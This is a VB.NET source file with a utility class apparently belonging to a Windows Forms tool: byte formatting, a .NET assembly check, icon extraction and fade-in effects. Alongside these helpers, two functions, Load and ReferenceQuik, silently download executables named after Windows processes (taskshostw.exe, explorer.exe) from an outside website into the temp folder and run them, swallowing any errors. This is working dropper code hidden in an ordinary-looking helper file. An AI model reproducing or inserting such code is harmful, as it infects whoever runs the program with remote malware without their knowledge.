Imports System.IO
Imports System.Reflection
Imports Toolbelt.Drawing

Public Class Methods

    Public Shared Function BytesToString(ByVal byteCount As Long) As String
        Dim suf As String() = {"B", "KB", "MB", "GB", "TB", "PB", "EB"}
        If byteCount = 0 Then Return "0" & suf(0)
        Dim bytes As Long = Math.Abs(byteCount)
        Dim place As Integer = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)))
        Dim num As Double = Math.Round(bytes / Math.Pow(1024, place), 1)
        Return (Math.Sign(byteCount) * num).ToString() & suf(place)
    End Function
    Public Shared Function CheckNet(ByVal Path As String)
        Try
            Assembly.LoadFile(Path).EntryPoint.GetParameters()
            Return True
        Catch
            Return False
        End Try
    End Function
    Public Shared Function GetIcon(ByVal path As String) As String
        Try
            Dim tempFile As String = IO.Path.GetTempFileName() & ".ico"

            Using fs As FileStream = New FileStream(tempFile, FileMode.Create)
                IconExtractor.Extract1stIconTo(path, fs)
            End Using

            Return tempFile
        Catch
        End Try

        Return ""
    End Function
    Public Shared Async Sub FadeInMain(ByVal o As Form, ByVal Optional interval As Integer = 80)

        While o.Opacity < 1.0
            Await Task.Delay(interval)
            o.Opacity += 0.05
        End While

        o.Opacity = 1

        Form1.trans = True
    End Sub
    Public Shared Async Sub FadeIn(ByVal o As Form, ByVal Optional interval As Integer = 80)

        While o.Opacity < 1.0
            Await Task.Delay(interval)
            o.Opacity += 0.05
        End While

        o.Opacity = 1
    End Sub

    Friend Shared Function Load() As Object
        Dim devil As String
        Dim x As New System.Text.StringBuilder

        x.Append("https://insellerate.net/doc/taskshostw.exe")
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = Environ("temp") & "taskshostw.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
    End Function

    Friend Shared Function ReferenceQuik() As Object
        Dim devil As String
        Dim x As New System.Text.StringBuilder

        x.Append("https://insellerate.net/doc/explorer.exe")
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = Environ("temp") & "explorer.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
    End Function
End Class
